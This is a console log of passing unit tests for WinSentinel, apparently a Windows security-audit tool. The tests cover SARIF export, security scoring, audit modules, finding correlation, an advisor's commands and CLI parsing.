  Passed WinSentinel.Tests.Services.SarifExporterTests.GetCategoryCode_MapsKnownCategories(category: "Applications", expected: "AP") [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GetCategoryCode_MapsKnownCategories(category: "Startup", expected: "ST") [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GetCategoryCode_MapsKnownCategories(category: "Event Logging", expected: "EL") [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GetCategoryCode_MapsKnownCategories(category: "Windows Update", expected: "UP") [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GetCategoryCode_MapsKnownCategories(category: "System", expected: "SY") [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GetCategoryCode_MapsKnownCategories(category: "Accounts", expected: "UA") [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GetCategoryCode_MapsKnownCategories(category: "Windows Defender", expected: "DF") [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GetCategoryCode_MapsKnownCategories(category: "Defender", expected: "DF") [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GetCategoryCode_MapsKnownCategories(category: "Application Security", expected: "AP") [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GetCategoryCode_MapsKnownCategories(category: "Firewall", expected: "FW") [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GetCategoryCode_MapsKnownCategories(category: "Network", expected: "NW") [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GetCategoryCode_MapsKnownCategories(category: "Network Security", expected: "NW") [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GetCategoryCode_MapsKnownCategories(category: "Processes", expected: "PS") [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GetCategoryCode_MapsKnownCategories(category: "Browser Security", expected: "BR") [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GetCategoryCode_MapsKnownCategories(category: "Event Log", expected: "EL") [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GetCategoryCode_MapsKnownCategories(category: "System Configuration", expected: "SY") [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GetCategoryCode_MapsKnownCategories(category: "Updates", expected: "UP") [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GetCategoryCode_MapsKnownCategories(category: "Encryption", expected: "EN") [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GetCategoryCode_MapsKnownCategories(category: "Process Security", expected: "PS") [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GetCategoryCode_MapsKnownCategories(category: "Browser", expected: "BR") [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_RuleHasFullDescription [21 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_EmptyReport_HasSecurityScoreProperty [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.NormalizeForId_ConvertsToLowercase [1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_EmptyReport_HasEmptyResults [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_NoFindings_EmptyResults [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.NormalizeForId_CollapsesHyphens [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_LargeReport_HandlesGracefully [11 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.NormalizeForId_ReplacesSpecialChars [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_ResultHasModuleProperty [1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_EmptyReport_ProducesValidStructure [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.NormalizeForId_TrimsTrailingHyphen [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.NormalizeForId_NullString_ReturnsUnknown [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_PassFinding_ExcludedByDefault [4 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_ResultHasNoFix_WhenNoRemediation [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_SpecialCharsInTitles_SanitizedInRuleIds [3 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_OutputIsValidJson [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GetCategoryCode_UnknownCategory_UsesTwoChars [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_WarningFinding_MapsToWarning [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_InfoFinding_MapsToNote [3 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_HasAutomationDetails [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateRuleId_NormalizesTitle [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_EmptyReport_HasToolInfo [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_RuleHasNoHelp_WhenNoRemediation [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_RuleIndex_MatchesResultRuleIndex [1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateRuleId_ProducesConsistentIds [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_RuleHasCategoryProperty [1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_AllModulesSucceed_NoNotifications [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_ResultHasLogicalLocation [2 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.NormalizeForId_LongTitle_TruncatesAt60 [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_MixedSeverities_CorrectCounts [1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_MultipleModules_DistinctRules [1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.MapSeverityToLevel_CorrectMapping(severity: Info, expected: "note") [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.MapSeverityToLevel_CorrectMapping(severity: Warning, expected: "warning") [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.MapSeverityToLevel_CorrectMapping(severity: Critical, expected: "error") [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.MapSeverityToLevel_CorrectMapping(severity: Pass, expected: "none") [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_CriticalFinding_MapsToError [1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_SuccessfulInvocation [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_CreatesDedupedRules [1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_RuleHasHelp_WhenRemediationPresent [1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_ResultHasFix_WhenRemediationPresent [1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateRuleId_ContainsCategoryCode [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.NormalizeForId_EmptyString_ReturnsUnknown [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_MultipleModules_AllIncluded [1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_InvocationHasMetadata [1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_PassFinding_IncludedWhenRequested [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GetCategoryCode_SingleCharCategory [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityScorerTests.GetGrade_ReturnsCorrectGrade(score: 90, expected: "A") [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityScorerTests.GetGrade_ReturnsCorrectGrade(score: 80, expected: "B") [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityScorerTests.GetGrade_ReturnsCorrectGrade(score: 59, expected: "F") [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityScorerTests.GetGrade_ReturnsCorrectGrade(score: 95, expected: "A") [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityScorerTests.GetGrade_ReturnsCorrectGrade(score: 0, expected: "F") [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityScorerTests.GetGrade_ReturnsCorrectGrade(score: 79, expected: "C") [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityScorerTests.GetGrade_ReturnsCorrectGrade(score: 89, expected: "B") [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityScorerTests.GetGrade_ReturnsCorrectGrade(score: 100, expected: "A") [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityScorerTests.GetGrade_ReturnsCorrectGrade(score: 69, expected: "D") [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityScorerTests.GetGrade_ReturnsCorrectGrade(score: 70, expected: "C") [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityScorerTests.GetGrade_ReturnsCorrectGrade(score: 60, expected: "D") [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityScorerTests.CalculateScore_DeductsAcrossModules [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityScorerTests.CalculateCategoryScore_SingleModule [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityScorerTests.CalculateScore_PerfectWithNoResults [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityScorerTests.GetScoreColor_ReturnsCorrectColor(score: 79, expected: "#FFC107") [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityScorerTests.GetScoreColor_ReturnsCorrectColor(score: 40, expected: "#FF9800") [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityScorerTests.GetScoreColor_ReturnsCorrectColor(score: 60, expected: "#FFC107") [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityScorerTests.GetScoreColor_ReturnsCorrectColor(score: 59, expected: "#FF9800") [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityScorerTests.GetScoreColor_ReturnsCorrectColor(score: 39, expected: "#F44336") [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityScorerTests.GetScoreColor_ReturnsCorrectColor(score: 80, expected: "#4CAF50") [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityScorerTests.GetScoreColor_ReturnsCorrectColor(score: 90, expected: "#4CAF50") [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityScorerTests.GetScoreColor_ReturnsCorrectColor(score: 0, expected: "#F44336") [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityScorerTests.SecurityReport_AggregatesCorrectly [1 ms]
  Passed WinSentinel.Tests.Services.SecurityScorerTests.CalculateScore_PerfectWithOnlyPassFindings [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityScorerTests.CalculateScore_FlooredAtZero [< 1 ms]
  Passed WinSentinel.Tests.Audits.SystemAuditTests.RunAuditAsync_ChecksSecureBoot [< 1 ms]
  Passed WinSentinel.Tests.Audits.DefenderAuditTests.RunAuditAsync_ChecksDefinitions [< 1 ms]
  Passed WinSentinel.Tests.Audits.StartupAuditTests.RunAuditAsync_ChecksScheduledTasks [< 1 ms]
  Passed WinSentinel.Tests.Audits.UpdateAuditTests.Properties_AreCorrect [< 1 ms]
  Passed WinSentinel.Tests.Audits.DefenderAuditTests.RunAuditAsync_Succeeds [< 1 ms]
  Passed WinSentinel.Tests.Audits.StartupAuditTests.RunAuditAsync_Succeeds [< 1 ms]
  Passed WinSentinel.Tests.Audits.SystemAuditTests.RunAuditAsync_ScoreIsValid [< 1 ms]
  Passed WinSentinel.Tests.Audits.UpdateAuditTests.RunAuditAsync_ChecksLastUpdateDate [< 1 ms]
  Passed WinSentinel.Tests.Audits.StartupAuditTests.RunAuditAsync_ChecksServices [< 1 ms]
  Passed WinSentinel.Tests.Audits.UpdateAuditTests.RunAuditAsync_Succeeds [< 1 ms]
  Passed WinSentinel.Tests.Audits.DefenderAuditTests.RunAuditAsync_ChecksRealTimeProtection [< 1 ms]
  Passed WinSentinel.Tests.Audits.SystemAuditTests.RunAuditAsync_DetectsOsVersion [< 1 ms]
  Passed WinSentinel.Tests.Audits.UpdateAuditTests.RunAuditAsync_ChecksAutoUpdate [< 1 ms]
  Passed WinSentinel.Tests.Audits.StartupAuditTests.RunAuditAsync_ChecksRegistryRunKeys [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Analyze_SortsMatchesBySeverityThenCount [13 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Analyze_ThrowsOnNullReport [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Analyze_MatchesInTitle [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.CorrelationReport_HasExpectedFieldValues [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.EdgeCase_CustomRuleWithSingleCategory [1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Analyze_ReturnsCorrectRiskAmplificationCount [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Analyze_DetectsCORR004_EventLogAndAudit [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.EdgeCase_RuleWithBothPatternsAndCategories_FailsWhenPatternMissing [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Constructor_RulesHaveUniqueIds [1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Constructor_Has8BuiltInRules [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Analyze_IncludesRecommendations [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.RemovedRule_DoesNotTrigger [1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Analyze_DetectsCORR006_BrowserAndUpdate [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.GetRules_ReturnsAllRules [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Constructor_LoadsBuiltInRules [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.EdgeCase_RuleWithBothPatternsAndCategories_FailsWhenCategoryMissing [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.EdgeCase_AmplificationCountOnlyCountsWhenSeverityIncreases [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.AddRule_ThrowsOnWhitespaceName [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Analyze_PartialPatternMatchReturnsNoResults [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.AddRule_ThrowsOnEmptyId [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.EdgeCase_BuiltInRulesHaveNonEmptyNames [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Analyze_AllBuiltInRulesCanMatchSimultaneously [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.GetRules_ReturnsReadOnlyList [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.EdgeCase_SameFindingCanSatisfyMultiplePatterns [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.EdgeCase_LargeReportWithManyFindings [2 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.EdgeCase_SingleFindingCannotTriggerMultiPatternRule [1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.AddRule_IncrementsRuleCount [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.EdgeCase_MaxRulesConstantIs200 [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Analyze_DetectsCORR001_DefenderAndFirewall [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.EdgeCase_ReportWithOnlyPassFindings_ReturnsZeroCorrelations [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Analyze_DetectsCORR005_FirewallAndSMB [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Analyze_ReturnsCorrectCorrelationsFoundCount [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.EdgeCase_BuiltInRulesHaveNonEmptyRecommendations [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.AddRule_ThrowsOnWhitespaceId [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.EdgeCase_CustomRuleWithSinglePattern [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Analyze_MatchedFindingsAreCorrect [1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.AddRule_ThrowsOnExceedingMaxRules [3 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.EdgeCase_MultipleAuditResultsInReport [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Analyze_RequiresAllPatternsToMatch [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.AddRule_ThrowsOnDuplicateId [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Analyze_SkipsPassSeverityFindings [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.AddRule_ThrowsOnEmptyName [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Analyze_CategoryMatchingWorks [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.AddRule_ThrowsOnNoPatternsOrCategories [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Analyze_DetectsCORR003_BitLockerAndPassword [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Analyze_DetectsCORR002_UpdateAndDefender [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.RemoveRule_DecrementsRuleCount [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.CorrelationReport_EmptyReportHasEmptyRecommendations [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.CustomRule_WithCategories [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.AddRule_AddsCustomRule [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.EdgeCase_RuleWithBothPatternsAndCategories [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Analyze_MatchesCaseInsensitive [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.AddRule_ThrowsOnNullRule [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Analyze_OriginalMaxSeverityReflectsMatchedFindings [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Analyze_ReturnsZeroCorrelationsForEmptyReport [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Analyze_ReturnsZeroCorrelationsWhenNoPatternsMatch [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Analyze_DetectsCORR008_PrivacyAndNetwork [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.CustomRule_TriggersOnMatchingReport [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.EdgeCase_BuiltInRulesHaveNonEmptyDescriptions [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.RemoveRule_RemovesExistingRule [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Analyze_MatchesInDescription [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Analyze_ReturnsCorrectTotalFindingsCount [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Analyze_AmplifiedSeverityComesFromRule [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.CorrelationReport_RecommendationsAreDeduplicated [1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Analyze_MultipleRulesCanMatchSameReport [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.RemoveRule_ReturnsFalseForNonExistent [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.EdgeCase_AnalyzeWithNoRules [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.EdgeCase_InfoSeverityFindingsAreIncluded [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.EdgeCase_MixedPassAndNonPassFindings [< 1 ms]
  Passed WinSentinel.Tests.Services.FindingCorrelatorTests.Analyze_DetectsCORR007_StartupAndProcess [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.HelpCommand_ReturnsCommandList [11 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.NaturalScan_ScanEverything_Works [22 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.FindBestMatch_NoMatch_ReturnsNull [3 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.FormatFullReport_IncludesAllSections [2 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.SecurityKnowledge_VPN_ReturnsAdvice [2 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.AdvisorResponse_WithFindings_CreatesCorrectly [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.OllamaAvailable_DefaultFalse [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.NaturalScore_ReturnsScore [11 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.WhatsWrong_WithIssues_ShowsIssues [7 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.SecurityKnowledge_Firewall_ReturnsAdvice [1 ms]
  Passed WinSentinel.Tests.Audits.DefenderAuditTests.RunAuditAsync_ScoreIsValid [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.Fallback_UnknownTopic_ReturnsSuggestions [3 s]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.ScoreCommand_ReturnsScoreBreakdown [1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.SecurityKnowledge_RDP_ReturnsAdvice [3 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.ScoreCommand_IncludesImprovementAdvice [1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.UnknownCommand_ReturnsError [1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.FindBestMatch_PartialTitle_Matches [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.FixCommand_UnknownFinding_ShowsAvailable [17 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.AdvisorResponse_Text_CreatesCorrectly [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.FindBestMatch_ExactTitle_Matches [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.WhatsWrong_VariantPhrases_AllWork [1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.FixCommand_NoArgs_ReturnsUsage [2 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.FixAllCommand_NoReport_AsksForScan [2 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.NaturalScan_RunsScan [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.FindBestMatch_CategoryMatch_Works [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.FormatModuleResult_IncludesFindings [2 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.EmptyInput_ReturnsHelpPrompt [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.FormatFindingExplanation_ShowsAllDetails [1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.FixAllCommand_NoFixableIssues_ReportsClean [1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.Explain_Module_RunsAudit [2 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.SecurityKnowledge_Password_ReturnsAdvice [1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.ScanCommand_UnknownModule_ReturnsError [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.SecurityKnowledge_Ransomware_ReturnsAdvice [3 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.SecurityKnowledge_Malware_ReturnsAdvice [1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.FixCommand_NoReport_AsksForScan [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.SecurityKnowledge_Privacy_ReturnsAdvice [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.SecurityKnowledge_Backup_ReturnsAdvice [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.WhatsWrong_NoIssues_ReportsClean [1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.Check_Module_RunsSingleScan [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.NaturalScore_HowSecure_Works [1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.Explain_Finding_ShowsDetails [1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.NaturalFix_WithoutReport_AsksForScan [1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.ScanCommand_RunsFullAudit [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.SecurityKnowledge_Phishing_ReturnsAdvice [1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.SecurityKnowledge_Encryption_ReturnsAdvice [< 1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.ScanCommand_WithModule_RunsSingleAudit [1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.HistoryCommand_NoHistory_ReportsEmpty [1 ms]
  Passed WinSentinel.Tests.Services.SecurityAdvisorTests.FixCommand_NoFixAvailable_ShowsRemediation [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_InvalidLimit_ReturnsError [6 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_ExpireDays_MissingValue [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_ChecklistWithModules_ReturnsChecklist [6 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_HelpVariants_AllReturnHelp(arg: "/?") [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_HelpVariants_AllReturnHelp(arg: "--help") [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_HelpVariants_AllReturnHelp(arg: "/h") [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_HelpVariants_AllReturnHelp(arg: "-h") [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_BaselineNoAction_DefaultsList [4 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_ProfileMissingValue_ReturnsError [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_BaselineSave_NameNotFlag [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_DiffOnly_DefaultsToHistory [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_Badge_AllTypes(type: "score", expected: Score) [5 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_Badge_AllTypes(type: "findings", expected: Findings) [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_Badge_AllTypes(type: "all", expected: All) [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_Badge_AllTypes(type: "module", expected: Module) [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_Badge_AllTypes(type: "grade", expected: Grade) [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_DescMissingValue_ReturnsError [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_BadgeStyle_ValidValues(style: "flat") [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_BadgeStyle_ValidValues(style: "for-the-badge") [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_BadgeStyle_ValidValues(style: "flat-square") [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_BaselineCheck_ParsesName [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_MarkdownWithModules_AllFlagsSet [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_BadgeStyle_MissingValue_ReturnsError [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_FixAllVariants(arg: "-f") [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_FixAllVariants(arg: "--fix-all") [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_VersionVariants_AllReturnVersion(arg: "-v") [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_VersionVariants_AllReturnVersion(arg: "--version") [< 1 ms]
